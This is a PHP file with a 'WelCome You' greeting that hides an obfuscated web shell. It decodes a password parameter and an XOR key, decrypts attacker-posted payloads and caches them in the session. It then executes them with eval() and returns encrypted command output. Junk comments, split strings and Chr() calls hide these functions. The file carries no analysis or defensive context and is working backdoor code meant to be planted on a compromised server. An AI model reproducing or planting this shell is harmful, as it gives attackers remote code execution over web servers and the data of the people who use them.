WelCome You
<?pHP
@session_start();
@set_time_limit(Chr("48"));
@error_reporting/*XgqDFRyh*/(Chr("48"));
function TBJMrJbr(/*SgFTxdWt*/$XPNsKqcI,$mdtawTrX){
    for($VbBrJVdz=Chr("48");$VbBrJVdz<strlen($XPNsKqcI);$VbBrJVdz++) {
        $qjjCEmHf = $mdtawTrX[$VbBrJVdz+Chr("49")&15];
        $XPNsKqcI[$VbBrJVdz] = $XPNsKqcI[$VbBrJVdz]^$qjjCEmHf;
    }
    return $XPNsKqcI;
}
$hLNYCoYb = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
$base64_TBJMrJbr = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
$wtofSrqm = $hLNYCoYb("cXExMjM=");
$dZvOBoRj='p'.$hLNYCoYb("YXlsb2Fk");
$qgXDXFbR='31c86b72'.$hLNYCoYb("ZDg2MmVhYTk=");
if (isset($_POST/*zASLpgtn*/[$wtofSrqm])){
    $datDLGCIwSW=TBJMrJbr/*HmjHjRrc*/($hLNYCoYb($_POST[$wtofSrqm]),$qgXDXFbR);
    if (/*dDyKtdig*/isset($_SESSION/*rJbKtyTa*/[$dZvOBoRj])){
        $ZmEnQZEj=TBJMrJbr($_SESSION/*xHyHVUJT*/[$dZvOBoRj],$qgXDXFbR);
        if (/*DUglQzOZ*/strpos($ZmEnQZEj,$hLNYCoYb/*yNfogvRx*/("Z2V0QmFzaWNzSW5mbw=="))===false){
            $ZmEnQZEj=TBJMrJbr/*DyaSdDmg*/($ZmEnQZEj,$qgXDXFbR);
        }
		define("gSWDqDTh","//nOXFoiAl\r\n".$ZmEnQZEj);
		 eval("/*pass-DP@i*/".gSWDqDTh."");
        echo substr(/*KJEVWRCb*/md5/*wmNFdCcC*/($wtofSrqm.$qgXDXFbR),Chr("48"),16);
        echo $base64_TBJMrJbr(TBJMrJbr(@run($datDLGCIwSW),$qgXDXFbR));
        echo substr(/*etAMzocE*/md5/*LzChwogv*/($wtofSrqm.$qgXDXFbR),16);
    }else{
        if (strpos/*UVJjrivx*/($datDLGCIwSW,$hLNYCoYb("Z2V0QmFzaWNzSW5mbw=="))!==false){
            $_SESSION[$dZvOBoRj]=TBJMrJbr($datDLGCIwSW,$qgXDXFbR);
        }
    }
}
?>

//EpKpcAnO